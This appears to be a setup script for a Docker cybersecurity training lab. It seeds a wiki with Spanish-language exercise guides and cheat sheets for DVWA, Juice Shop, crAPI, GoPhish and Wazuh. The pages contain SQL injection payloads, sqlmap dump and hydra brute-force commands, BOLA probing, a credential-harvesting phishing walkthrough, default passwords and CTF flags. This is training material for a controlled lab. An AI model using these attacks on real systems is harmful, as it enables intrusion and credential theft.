#!/bin/sh
# services/wiki/configure_wiki.sh
# Sidecar idempotente: verifica BookStack y crea estructura basica de contenido.
# Usa el token de API creado por bookstack-init.sh en el contenedor principal.

. /lib/common.sh

WIKI_URL="http://opsn-wiki:80"
# Token creado por bookstack-init.sh — generado aleatoriamente en cada instalación
TOKEN_ID="${OPSN_WIKI_TOKEN_ID:-opsn_init_id_placeholder}"
TOKEN_SECRET="${OPSN_WIKI_TOKEN_SECRET:-opsn_init_secret_placeholder}"
AUTH_HEADER="Authorization: Token ${TOKEN_ID}:${TOKEN_SECRET}"

# ─────────────────────────────────────────────────────
# 1. Esperar que BookStack este disponible
# ─────────────────────────────────────────────────────
wait_for_api "$WIKI_URL" 180 || exit 1

# Esperar adicional para que bookstack-init.sh ejecute artisan
log_step "Esperando que el token de API este disponible..."
TRIES=0
until curl -sf -H "$AUTH_HEADER" "$WIKI_URL/api/books" > /dev/null 2>&1; do
    TRIES=$((TRIES + 1))
    if [ $TRIES -ge 20 ]; then
        log_warn "Token de API aun no disponible. Las guias se cargaran manualmente mas adelante."
        exit 0
    fi
    sleep 5
done
log_info "Token de API confirmado."

# ─────────────────────────────────────────────────────
# Funcion: buscar recurso por nombre en un endpoint
# Retorna el ID o vacio si no existe.
# El JSON de BookStack siempre pone "id" antes que "name".
# ─────────────────────────────────────────────────────
find_by_name() {
    local endpoint="$1"   # ej: /api/books, /api/chapters, /api/pages
    local name="$2"
    local all normalized escaped_name result
    all=$(curl -sf -H "$AUTH_HEADER" "$WIKI_URL${endpoint}?count=500" 2>/dev/null)
    # Normaliza JSON: elimina espacios en sintaxis y decodifica escapes Unicode comunes
    normalized=$(printf '%s' "$all" | \
        sed 's/:[[:space:]]*/:/g; s/,[[:space:]]*/,/g' | \
        sed 's/\\u2014/—/g')
    escaped_name=$(printf '%s' "$name" | sed 's/[[\.*^$()+?{}|]/\\&/g')

    # Caso A: "id":N,...,"name":"VALUE" (libros, capitulos — id precede a name)
    result=$(printf '%s' "$normalized" | \
        sed -n "s/.*\"id\":\([0-9]*\),[^{]*\"name\":\"${escaped_name}\".*/\1/p" | head -1)

    # Caso B: "name":"VALUE",...,"id":N (paginas — name precede a id)
    if [ -z "$result" ]; then
        result=$(printf '%s' "$normalized" | \
            sed -n "s/.*\"name\":\"${escaped_name}\",[^{]*\"id\":\([0-9]*\).*/\1/p" | head -1)
    fi

    printf '%s' "$result"
}

# ─────────────────────────────────────────────────────
# Funcion: crear libro si no existe, retorna ID
# ─────────────────────────────────────────────────────
create_book() {
    local name="$1"
    local description="$2"

    EXISTING_ID=$(find_by_name "/api/books" "$name")

    if [ -n "$EXISTING_ID" ]; then
        log_info "Libro ya existe: $name (id=$EXISTING_ID)" >&2
        echo "$EXISTING_ID"
        return 0
    fi

    RESP=$(api_post "$WIKI_URL/api/books" \
        "{\"name\":\"$name\",\"description\":\"$description\"}" \
        "$AUTH_HEADER")
    ID=$(echo "$RESP" | sed -n 's/.*"id":\([0-9]*\).*/\1/p' | head -1)
    log_info "Libro creado: $name (id=$ID)" >&2
    echo "$ID"
}

# ─────────────────────────────────────────────────────
# Funcion: crear capitulo en un libro
# ─────────────────────────────────────────────────────
create_chapter() {
    local book_id="$1"
    local name="$2"
    local description="$3"

    EXISTING_ID=$(find_by_name "/api/chapters" "$name")

    if [ -n "$EXISTING_ID" ]; then
        log_info "Capitulo ya existe: $name" >&2
        echo "$EXISTING_ID"
        return 0
    fi

    RESP=$(api_post "$WIKI_URL/api/chapters" \
        "{\"book_id\":$book_id,\"name\":\"$name\",\"description\":\"$description\"}" \
        "$AUTH_HEADER")
    ID=$(echo "$RESP" | sed -n 's/.*"id":\([0-9]*\).*/\1/p' | head -1)
    log_info "Capitulo creado: $name (id=$ID)" >&2
    echo "$ID"
}

# ─────────────────────────────────────────────────────
# Funcion: crear pagina en un capitulo
# ─────────────────────────────────────────────────────
create_page() {
    local chapter_id="$1"
    local name="$2"
    local markdown="$3"

    EXISTING_ID=$(find_by_name "/api/pages" "$name")

    if [ -n "$EXISTING_ID" ]; then
        log_info "Pagina ya existe: $name"
        return 0
    fi

    # Escapar backslashes, comillas, tabs y newlines para JSON valido
    MD_ESCAPED=$(printf '%s' "$markdown" | \
        sed 's/\\/\\\\/g; s/"/\\"/g; s/	/\\t/g' | \
        awk 'BEGIN{ORS="\\n"} {print}' | \
        sed 's/\\n$//')

    api_post "$WIKI_URL/api/pages" \
        "{\"chapter_id\":$chapter_id,\"name\":\"$name\",\"markdown\":\"$MD_ESCAPED\"}" \
        "$AUTH_HEADER" > /dev/null

    log_info "Pagina creada: $name"
}

# ─────────────────────────────────────────────────────
# 2. Crear estructura de contenido
# ─────────────────────────────────────────────────────
log_step "Creando estructura de contenido en BookStack..."

# Libro principal de guias
GUIDES_BOOK=$(create_book "Guias del Lab" "Guias paso a paso para completar los ejercicios de OpenSec Lab")

# Capitulo: Introduccion
INTRO_CHAPTER=$(create_chapter "$GUIDES_BOOK" "Introduccion" "Como usar el laboratorio")
create_page "$INTRO_CHAPTER" "Bienvenido a OpenSec Lab" \
"# Bienvenido a OpenSec Lab

OpenSec Lab es un laboratorio de ciberseguridad basado en Docker que te permite practicar tecnicas de seguridad ofensiva y defensiva en un entorno controlado.

## Servicios disponibles

| Servicio | URL | Descripcion |
|----------|-----|-------------|
| DNS (Technitium) | http://localhost:5380 | Servidor DNS del lab |
| GoPhish | https://localhost:3333 | Framework de phishing |
| DVWA | http://localhost:8080 | App web vulnerable |
| Juice Shop | http://localhost:3000 | App web vulnerable OWASP |
| WebGoat | http://localhost:8081/WebGoat | Plataforma de aprendizaje |
| crAPI | http://localhost:8025 | API vulnerable |
| Mail (Roundcube) | http://localhost:8888 | Correo del lab |
| Portainer | https://localhost:9443 | Gestion de Docker |

## Por donde empezar

1. Elige un servicio vulnerable (DVWA, Juice Shop, WebGoat, crAPI, GoPhish)
2. Las guias en esta wiki te explican paso a paso cada ejercicio
3. Practica tecnicas ofensivas y defensivas en un entorno controlado

## Credenciales por defecto

- **Mail:** admin@opensec.lab / user@opensec.lab — contrasena: Password
- **DVWA:** admin / admin
- **GoPhish:** admin / Password
- **Wiki:** admin@opensec.lab / Password
- **DNS:** admin / Password"

# Capitulo: Ejercicios Web
WEB_CHAPTER=$(create_chapter "$GUIDES_BOOK" "Ejercicios Web" "Guias para retos de seguridad web")
create_page "$WEB_CHAPTER" "SQL Injection en DVWA" \
"# SQL Injection en DVWA

## Objetivo
Explotar una vulnerabilidad de SQL Injection en DVWA para extraer informacion de la base de datos.

## Paso a paso

### 1. Acceder a DVWA
- URL: http://localhost:8080
- Usuario: admin / Contrasena: admin
- Si pide configuracion de DB, haz clic en 'Create / Reset Database'

### 2. Configurar nivel de dificultad
- Ve a DVWA Security
- Selecciona **Low**
- Haz clic en Submit

### 3. Navegar a SQL Injection
- Menu lateral: SQL Injection

### 4. Explotar la vulnerabilidad

Prueba con la siguiente entrada en el campo ID:
\`\`\`
' OR '1'='1
\`\`\`

Para extraer informacion de la tabla usuarios:
\`\`\`
' UNION SELECT user, password FROM users-- -
\`\`\`

### 5. Automatizar con sqlmap
\`\`\`bash
sqlmap -u 'http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='PHPSESSID=TU_SESSION; security=low' \
  --dbs --dump
\`\`\`

## Flag
Una vez que extraigas los datos de la tabla users, el flag es: **OPSN{sql_1nj3ct10n_byp4ss}**"

# Capitulo: Phishing
PHISH_CHAPTER=$(create_chapter "$GUIDES_BOOK" "Ejercicios de Phishing" "Como usar GoPhish para simulaciones de phishing")
create_page "$PHISH_CHAPTER" "Lanzar campana de phishing con GoPhish" \
"# Campana de Phishing con GoPhish

## Objetivo
Aprender a configurar y lanzar una campana de phishing usando GoPhish.

## Acceso
- URL: https://localhost:3333 (acepta el certificado autofirmado)
- Usuario: admin / Contrasena: Password

## La campana ya esta pre-configurada

El lab crea automaticamente:
- **Sending Profile:** Perfil SMTP apuntando al mail server interno
- **Email Template:** Correo de restablecimiento de contrasena de 'Acme Corp'
- **Landing Page:** Pagina de captura de credenciales
- **User Group:** Usuarios objetivo (admin@opensec.lab, user@opensec.lab)

## Paso a paso

### 1. Crear y lanzar campana
1. Ve a Campaigns > New Campaign
2. Nombre: 'Lab Campaign 1'
3. Email Template: selecciona el pre-configurado
4. Landing Page: selecciona el pre-configurado
5. URL: http://localhost (la URL del phishing listener)
6. Sending Profile: selecciona el pre-configurado
7. Users & Groups: selecciona el grupo pre-configurado
8. Launch Date: Now
9. Haz clic en Launch Campaign

### 2. Revisar resultados
- GoPhish muestra en tiempo real quienes abrieron el email, quienes hicieron clic, y quienes ingresaron credenciales

### 3. Ver el email recibido
- Abre Thunderbird en el Desktop (http://localhost:3100) o Roundcube (http://localhost:8888)
- El usuario 'user' deberia recibir el email de phishing

## Flag
Revisa el codigo fuente HTML de la Landing Page en GoPhish. El flag esta en un comentario HTML."

# Libro de Cheat Sheets
CHEAT_BOOK=$(create_book "Cheat Sheets" "Referencias rapidas de herramientas de seguridad")

# nmap
TOOLS_CHAPTER=$(create_chapter "$CHEAT_BOOK" "Herramientas de Red" "nmap, netcat y otras herramientas de red")
create_page "$TOOLS_CHAPTER" "nmap — Escaneo de redes" \
"# nmap Cheat Sheet

## Escaneos basicos

\`\`\`bash
# Ping scan (descubrir hosts)
nmap -sn 172.18.0.0/24

# Escaneo de puertos comunes
nmap 172.18.0.1-10

# Escaneo completo de todos los puertos
nmap -p- 172.18.0.5

# Deteccion de version de servicios
nmap -sV 172.18.0.5

# Deteccion de OS
nmap -O 172.18.0.5

# Escaneo agresivo (version + OS + scripts + traceroute)
nmap -A 172.18.0.5
\`\`\`

## Scripts NSE utiles

\`\`\`bash
# Listar scripts disponibles
ls /usr/share/nmap/scripts/

# Ejecutar script especifico
nmap --script=http-title 172.18.0.0/24

# Scripts de vulnerabilidades
nmap --script vuln 172.18.0.5

# Banner grabbing
nmap --script=banner 172.18.0.5
\`\`\`

## Targets del lab

| Host | IP |
|------|----|
| DNS | 172.18.0.2 |
| DVWA | 172.18.0.3 |
| Juice Shop | 172.18.0.4 |
| GoPhish | 172.18.0.5 |
| Desktop | 172.18.0.6 |
| Mail | 172.18.0.7 |"

# Burp Suite
WEB_TOOLS_CHAPTER=$(create_chapter "$CHEAT_BOOK" "Herramientas Web" "Burp Suite, curl, sqlmap")
create_page "$WEB_TOOLS_CHAPTER" "Burp Suite — Proxy Web" \
"# Burp Suite Cheat Sheet

## Configuracion inicial

1. Abrir Burp Suite Community Edition
2. Proxy > Options > Proxy Listeners: 127.0.0.1:8080
3. Configurar el navegador para usar proxy 127.0.0.1:8080
4. En Firefox: Settings > Network Settings > Manual proxy > HTTP Proxy: 127.0.0.1, Port: 8080

## Funciones principales

### Interceptar trafico
- Proxy > Intercept > On
- Navega en el browser — cada peticion se captura

### Repeater
- Click derecho en peticion > Send to Repeater
- Modifica y reenvía peticiones manualmente

### Intruder (fuerza bruta)
- Click derecho > Send to Intruder
- Marca los parametros a fuzzer con Add §
- Payloads: carga tu lista de palabras
- Start Attack

## Comandos curl equivalentes

\`\`\`bash
# GET basico
curl -v http://localhost:8080

# POST con datos de formulario
curl -X POST http://localhost:8080/login \
  -d 'username=admin&password=admin'

# Con cookies
curl -b 'PHPSESSID=abc123' http://localhost:8080/admin

# Seguir redirecciones
curl -L http://localhost:8080

# Guardar cookies
curl -c cookies.txt http://localhost:8080/login
curl -b cookies.txt http://localhost:8080/dashboard
\`\`\`"

create_page "$WEB_TOOLS_CHAPTER" "sqlmap — SQL Injection automatizado" \
"# sqlmap Cheat Sheet

## Uso basico

\`\`\`bash
# Detectar SQLi en parametro GET
sqlmap -u 'http://localhost:8080/page?id=1'

# Con cookies de sesion
sqlmap -u 'http://localhost:8080/page?id=1' \
  --cookie='PHPSESSID=abc; security=low'

# Listar bases de datos
sqlmap -u 'URL' --dbs

# Listar tablas de una BD
sqlmap -u 'URL' -D dvwa --tables

# Volcar tabla especifica
sqlmap -u 'URL' -D dvwa -T users --dump

# POST request
sqlmap -u 'http://localhost:8080/login' \
  --data='username=admin&password=test' \
  --method=POST
\`\`\`

## DVWA especifico

\`\`\`bash
# Obtener tu session cookie de DVWA primero con el navegador, luego:
sqlmap -u 'http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='PHPSESSID=TU_SESSION_AQUI; security=low' \
  -D dvwa -T users --dump
\`\`\`"

# hydra
BRUTE_CHAPTER=$(create_chapter "$CHEAT_BOOK" "Fuerza Bruta" "hydra y ataques de diccionario")
create_page "$BRUTE_CHAPTER" "hydra — Fuerza bruta de credenciales" \
"# hydra Cheat Sheet

## Sintaxis general

\`\`\`bash
hydra -l <usuario> -p <contrasena> <host> <protocolo>
hydra -L <lista_usuarios> -P <lista_passwords> <host> <protocolo>
\`\`\`

## Protocolos comunes

\`\`\`bash
# HTTP POST (formulario de login)
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  localhost http-post-form \
  '/login:username=^USER^&password=^PASS^:F=Invalid credentials'

# HTTP GET con autenticacion basica
hydra -l admin -P wordlist.txt localhost http-get /admin

# SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.6

# FTP
hydra -l admin -P wordlist.txt ftp://172.18.0.7

# SMTP
hydra -l admin@opensec.lab -P wordlist.txt smtp://172.18.0.7
\`\`\`

## Opciones utiles

\`\`\`bash
-t 4        # Numero de threads paralelos (default 16, bajar para no romper el servicio)
-w 30       # Timeout por intento en segundos
-o out.txt  # Guardar resultados en archivo
-v          # Verbose (muestra cada intento)
-V          # Very verbose
-f          # Parar al primer exito
-s 8080     # Puerto alternativo
\`\`\`

## Ejemplo completo contra DVWA

\`\`\`bash
# 1. Primero obtener la cookie de sesion del formulario de login de DVWA:
curl -s -c /tmp/dvwa_cookies.txt \
  -d 'username=admin&password=admin&Login=Login' \
  http://localhost:8080/login.php

# 2. Ataque al formulario interno (cambia la cookie de sesion en el header):
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  localhost http-post-form \
  '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=TU_SESSION' \
  -t 4 -f
\`\`\`

## Wordlists utiles en Kali

| Ruta | Descripcion |
|------|-------------|
| /usr/share/wordlists/rockyou.txt.gz | 14M passwords reales (descomprimir primero) |
| /usr/share/seclists/Passwords/Common-Credentials/top-1000.txt | Top 1000 mas comunes |
| /usr/share/seclists/Usernames/top-usernames-shortlist.txt | Usuarios comunes |"

# curl para API testing
create_page "$WEB_TOOLS_CHAPTER" "curl — API Testing" \
"# curl para API Testing

## Verbos HTTP

\`\`\`bash
# GET
curl http://localhost:8025/identity/api/v2/user/dashboard

# POST con JSON
curl -X POST http://localhost:8025/identity/api/auth/signup \
  -H 'Content-Type: application/json' \
  -d '{\"email\":\"test@lab.com\",\"password\":\"Test1234!\",\"name\":\"Test User\"}'

# PUT
curl -X PUT http://api/resource/1 \
  -H 'Content-Type: application/json' \
  -d '{\"field\":\"new_value\"}'

# PATCH
curl -X PATCH http://api/resource/1 \
  -H 'Content-Type: application/json' \
  -d '{\"field\":\"value\"}'

# DELETE
curl -X DELETE http://api/resource/1 \
  -H 'Authorization: Bearer TOKEN'
\`\`\`

## Autenticacion

\`\`\`bash
# Bearer token (JWT)
curl -H 'Authorization: Bearer eyJ...' http://api/endpoint

# Basic auth
curl -u admin:Password http://api/endpoint

# Cookie
curl -b 'session=abc123' http://api/endpoint

# API Key en header
curl -H 'X-API-Key: mi-api-key' http://api/endpoint
\`\`\`

## Opciones de salida

\`\`\`bash
-v               # Verbose: muestra headers de request y response
-i               # Incluir headers de response en la salida
-s               # Silent: sin barra de progreso
-o /dev/null     # Descartar body
-w '%{http_code}' # Mostrar solo el codigo HTTP
-D headers.txt   # Guardar headers en archivo
\`\`\`

## Workflow tipico para explorar una API

\`\`\`bash
# 1. Login y capturar token
TOKEN=\$(curl -s -X POST http://localhost:8025/identity/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{\"email\":\"test@lab.com\",\"password\":\"Test1234!\"}' | \
  python3 -c 'import sys,json; print(json.load(sys.stdin)[\"token\"])')

# 2. Usar el token
curl -H \"Authorization: Bearer \$TOKEN\" \
  http://localhost:8025/identity/api/v2/user/dashboard

# 3. Probar BOLA — cambiar ID de otro usuario
curl -H \"Authorization: Bearer \$TOKEN\" \
  http://localhost:8025/identity/api/v2/vehicle/1/location
\`\`\`

## Contra crAPI (http://localhost:8025)

\`\`\`bash
# Registro
curl -X POST http://localhost:8025/identity/api/auth/signup \
  -H 'Content-Type: application/json' \
  -d '{\"email\":\"hacker@lab.com\",\"password\":\"Hacker123!\",\"name\":\"Hacker\"}'

# Login
curl -X POST http://localhost:8025/identity/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{\"email\":\"hacker@lab.com\",\"password\":\"Hacker123!\"}'

# Explorar endpoints disponibles
curl -H \"Authorization: Bearer \$TOKEN\" \
  http://localhost:8025/identity/api/v2/user/dashboard
\`\`\`"

# Guia Juice Shop
JUICE_CHAPTER=$(create_chapter "$GUIDES_BOOK" "OWASP Juice Shop" "Guia para explorar Juice Shop")
create_page "$JUICE_CHAPTER" "Juice Shop — Primeros pasos" \
"# OWASP Juice Shop — Primeros pasos

## Acceso

- URL: http://localhost:3000
- No requiere login para empezar (el registro es parte de los retos)

## El Score Board

El primer reto de Juice Shop es encontrar el Score Board oculto donde se listan todos los desafios.

### Como encontrarlo

1. Abre las DevTools del navegador (F12)
2. Ve a la pestana **Sources** o **Network**
3. Busca en los archivos JS por la palabra \`score-board\`
4. O navega directamente a: **http://localhost:3000/#/score-board**

Una vez encontrado, el Score Board muestra todos los retos organizados por dificultad (1-6 estrellas).

## Categorias de retos

| Categoria | Ejemplos |
|-----------|---------|
| Injection | SQL Injection en login, Order API |
| Broken Authentication | Login sin password, JWT forging |
| Sensitive Data Exposure | Acceso a archivos de backup |
| XSS | Reflected, DOM-based, Stored |
| Broken Access Control | Acceso a datos de otros usuarios |
| Security Misconfiguration | Directorio expuesto, headers faltantes |

## Reto recomendado para empezar: Login como admin

1. Ve a http://localhost:3000/#/login
2. En el campo de email, ingresa:
\`\`\`
' OR 1=1--
\`\`\`
3. Cualquier password
4. Resultado: sesion iniciada como admin@juice-sh.op

## Herramientas utiles

\`\`\`bash
# Interceptar trafico con Burp Suite (proxy en 127.0.0.1:8080)
# Configurar Firefox: Settings > Network > Manual proxy > HTTP: 127.0.0.1:8080

# Buscar endpoints con curl
curl -s http://localhost:3000/api/Products | python3 -m json.tool

# Ver todos los productos incluyendo eliminados
curl -s 'http://localhost:3000/api/Products?deletedAt=2019-01-01'
\`\`\`

## Flag del ejercicio

Una vez que encuentres el Score Board, el flag es: **OPSN{j01n_th3_sc0r3b04rd}**"

# Guia crAPI
CRAPI_CHAPTER=$(create_chapter "$GUIDES_BOOK" "API Security con crAPI" "Guia para ejercicios de seguridad en APIs")
create_page "$CRAPI_CHAPTER" "crAPI — Broken Object Level Authorization" \
"# crAPI — API Security

## Acceso

- URL: http://localhost:8025
- Requiere registro para usar la app

## Que es crAPI

crAPI (Completely Ridiculous API) simula una plataforma de gestion de vehiculos con vulnerabilidades tipicas de APIs REST del OWASP API Security Top 10.

## Paso 1: Crear una cuenta

\`\`\`bash
curl -X POST http://localhost:8025/identity/api/auth/signup \
  -H 'Content-Type: application/json' \
  -d '{
    \"email\": \"hacker@opensec.lab\",
    \"password\": \"Hacker123!\",
    \"name\": \"Lab User\",
    \"number\": \"+1234567890\"
  }'
\`\`\`

O via la interfaz web en http://localhost:8025

## Paso 2: Login y obtener token

\`\`\`bash
TOKEN=\$(curl -s -X POST http://localhost:8025/identity/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{\"email\":\"hacker@opensec.lab\",\"password\":\"Hacker123!\"}' | \
  python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get(\"token\",\"\"))')
echo \"Token: \$TOKEN\"
\`\`\`

## Paso 3: Explorar el dashboard

\`\`\`bash
curl -H \"Authorization: Bearer \$TOKEN\" \
  http://localhost:8025/identity/api/v2/user/dashboard
\`\`\`

## Vulnerabilidad principal: BOLA (API1)

BOLA = Broken Object Level Authorization. La API no verifica que el objeto pertenezca al usuario autenticado.

\`\`\`bash
# Ver tu propio vehiculo
curl -H \"Authorization: Bearer \$TOKEN\" \
  http://localhost:8025/community/api/v2/community/posts/recent

# BOLA: cambiar el ID del vehiculo por otro numero
# Si tienes vehiculo ID 1, probar con 2, 3, 4...
curl -H \"Authorization: Bearer \$TOKEN\" \
  http://localhost:8025/identity/api/v2/vehicle/OTRO_UUID/location
\`\`\`

## Referencia OWASP API Top 10

| # | Vulnerabilidad | Presente en crAPI |
|---|----------------|-------------------|
| API1 | BOLA | Si |
| API2 | Broken Authentication | Si |
| API3 | Broken Object Property Level Auth | Si |
| API4 | Unrestricted Resource Consumption | Si |
| API6 | Unrestricted Access to Sensitive Business Flows | Si |

## Flag del ejercicio

Al acceder a datos de otro usuario via BOLA, el flag es: **OPSN{br0k3n_0bj3ct_l3v3l_4uth}**"

WAZUH_CHAPTER=$(create_chapter "$GUIDES_BOOK" "Blue Team con Wazuh" "Analisis de alertas y deteccion de ataques con Wazuh SIEM")

create_page "$WAZUH_CHAPTER" "Analisis de logs en Wazuh" \
"# Analisis de logs en Wazuh SIEM

Wazuh es un SIEM (Security Information and Event Management) open source. En OpenSec Lab, Wazuh recopila logs de todos los contenedores y los correlaciona con reglas de deteccion custom.

## Acceso al Dashboard

1. Abre https://localhost:5601 en el navegador
2. Acepta el certificado autofirmado (Advanced > Proceed)
3. Credenciales: **admin / Password1.**
4. Ve a **Wazuh > Modules > Security Events**

## Arquitectura del stack

\`\`\`
Contenedores del lab (DVWA, GoPhish, Juice Shop...)
        ↓  logs via docker-listener
  Wazuh Manager  ←→  reglas: /var/ossec/etc/rules/openseclab.xml
        ↓
  Wazuh Indexer (OpenSearch)
        ↓
  Wazuh Dashboard (Kibana)
\`\`\`

Suricata IDS monitorea el trafico de red y escribe alertas en \`eve.json\`, que Wazuh lee via localfile.

## Paso 1: Ver alertas recientes

En el Dashboard:
- **Wazuh > Modules > Security Events** — todas las alertas ordenadas por tiempo
- Columnas importantes: \`rule.description\`, \`rule.level\`, \`data.srcip\`, \`agent.name\`

Para filtrar por servicio del lab, usa el buscador:
\`\`\`
rule.groups: openseclab_dvwa
rule.groups: openseclab_gophish
rule.groups: suricata
\`\`\`

## Paso 2: Generar una alerta de SQL Injection

1. Abre DVWA en http://localhost:8080 (admin/admin)
2. Ve a **DVWA Security** y pon nivel **Low**
3. Ve a **SQL Injection** y envia el payload: \`' OR '1'='1\`
4. Vuelve a Wazuh en unos segundos

En Security Events deberia aparecer una alerta con:
- \`rule.id: 100001\`
- \`rule.description\`: contiene \"SQL Injection en DVWA\"
- \`rule.level: 10\`

Haz click en la alerta para ver el detalle completo, incluyendo la descripcion de la regla.

## Paso 3: Explorar reglas custom del lab

Las reglas personalizadas estan en el Manager:

\`\`\`bash
docker exec opsn-wazuh-manager cat /var/ossec/etc/rules/openseclab.xml
\`\`\`

Reglas incluidas:

| Rule ID | Servicio | Deteccion |
|---------|----------|-----------|
| 100001 | DVWA | SQL Injection (/vulnerabilities/sqli) |
| 100002 | DVWA | Command Injection (/vulnerabilities/exec) |
| 100003 | DVWA | XSS reflejado (/vulnerabilities/xss_r) |
| 100004 | DVWA | File Inclusion (/vulnerabilities/fi) |
| 100010 | Juice Shop | Score Board descubierto |
| 100020 | GoPhish | Credencial capturada (landing page) |
| 100030 | WebGoat | Acceso a WebGoat |
| 100040 | crAPI | BOLA/IDOR en API de vehiculos |
| 100050+ | Suricata | Alertas IDS (port scan, brute force, etc.) |

## Paso 4: Alertas de Suricata IDS

Suricata analiza el trafico de red en tiempo real. Para ver sus alertas en Wazuh:

\`\`\`
rule.groups: suricata
\`\`\`

Para generar una alerta de escaneo de puertos desde el Desktop:

\`\`\`bash
# Desde el terminal del Desktop (http://localhost:3100)
nmap -sS 172.18.0.0/24
\`\`\`

En Wazuh deberia aparecer una alerta de tipo \`ET SCAN\` o la regla custom de port scan del lab.

## Paso 5: Busqueda avanzada con KQL

En Security Events, usa el buscador con sintaxis KQL:

\`\`\`kql
# Alertas de nivel alto
rule.level >= 10

# Ataques en DVWA
rule.groups: openseclab_dvwa AND rule.level > 8

# IP de origen especifica
data.srcip: 172.18.0.6

# Rango de tiempo + servicio
@timestamp >= now-1h AND rule.groups: openseclab
\`\`\`

## Flag del ejercicio

Al analizar la alerta de SQL Injection en Wazuh y encontrar la descripcion completa de la regla 100001, el flag del reto Blue Team es: **OPSN{su1c4t4_sql_1nj3ct10n_d3t3ct3d}**"

log_info "Contenido de BookStack cargado exitosamente."
exit 0
